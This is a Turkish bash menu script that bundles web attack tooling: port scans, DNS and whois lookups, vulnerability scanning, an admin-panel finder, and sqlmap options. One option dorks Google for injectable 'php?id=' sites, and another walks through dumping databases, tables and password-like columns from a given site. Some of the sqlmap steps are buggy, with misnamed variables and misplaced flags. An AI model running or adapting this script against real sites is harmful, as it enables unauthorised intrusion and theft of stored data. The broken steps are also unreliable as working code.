#! /bin/bash 
clear
echo "---------------WEB-------------"
Cafe="\033[0;33m"
echo -e $Cafe"1)Port tara 
2)whois sorgusu
3)DNS sorgu 
4)DNS Trafiğini izle
5)Açık Tara
6)Banner Yakala
7)Sql Açıklı site ara
8)sql injection
9)Apache Yayını başlat
10)Apache Yayınını Durdur
11)Admin Paneli bulucu
12)Sunucu Yol sorgusu
13)Tersine Dns(Beta)
14)Önemli Sayfaları Kontrol et(robot.txt vb.)
15)Mail Kontrol botu
16)Geri
 " 

echo -n "
Bir İşlem seçiniz: "
read islem
case $islem in 	
	1)echo -n "IP adresini giriniz: "
		read sayi
		nmap -sS -v $sayi
		sleep 20
		cd -
		 ./Çalıştır.sh;;
	2)echo -n "IP adresini giriniz: "
		read sayi1
		dmitry $sayi1
		sleep 25 
		 cd -
		 ./Çalıştır.sh;;
	3)echo -n "Sorgulanacak site: "
	  read site1
	  dig $site1
		sleep 30
		 cd -
		 ./Çalıştır.sh;;
	4)echo -n "Izlenecek site: "
	  read site2
	  dig +trace $site2
		sleep 35
		 cd -
		 ./Çalıştır.sh;;
	5)echo -n "Taranacak Web sitesi: "
	   read web
	   uniscan -u $web --qweds
		sleep 40
		 cd -
		 ./Çalıştır.sh;;
	6)echo -n "taranacak IP adresi: "
	   read IP2
	   telnet $IP2
		sleep 45
		 cd -
		 ./Çalıştır.sh;;
	7)sqlmap -g inurl:"php?id=";;
	8)echo -n "Site: "
		read site24
	   sqlmap -u $site24 --dbs
	   echo -n "Cekmek isteginiz tablo hangisi: "
		read table
	   sqlmap -u $site24 $table --tables
	   echo -n "Cekmek istediginiz kolonu yaziniz: "
		read kolon
	   echo -n "Cekmek istediginiz dosya adi nedir: "
		read  dosyaadi2
	   sqlmap -u $site24 -D $kolon -T $dosyaadi2 --columns
	   echo -n "Cekmek istediginiz 2.kolonu giriniz: "
		read kolon2 
	   sqlmap -u $site24 -D $kolon -T $dosyaadi2 -C $kolon2 --dump
	   echo -n "cekmek istediginiz 3. kolonun ismini giriniz: "
		read sifre123
	   sqlmap -u  $site24 -D $kolon -T $dosaadi2 -C $sifre123 --dump
		sleep 150
		 cd -
		 ./Çalıştır.sh;;
	9)service apache2 start
	   echo "Tamamlandı"
		sleep 4 
		 cd -
		 ./Çalıştır.sh;;
	10)service apache2 stop
	   echo "Tamamlandı"
		sleep 5
		 cd -
		 ./Çalıştır.sh;;
	11)python3 admin.py
		sleep 100
		 cd -
		 ./Çalıştır.sh;;
	12)echo -n "Sorgulanacak Adres: "
		read  adres265
		traceroute $adres265
		sleep 150
		 cd -
		 ./Çalıştır.sh;;
	13)python3 tersinedns.py;;
	14)python3 files.py;;
	15)cd Mailbot
	    python3 bot.py;;
	16)cd -
		 ./Çalıştır.sh;;
	*)echo "Yanlış Bir değer girdiniz..." 
		exit;;

esac
	
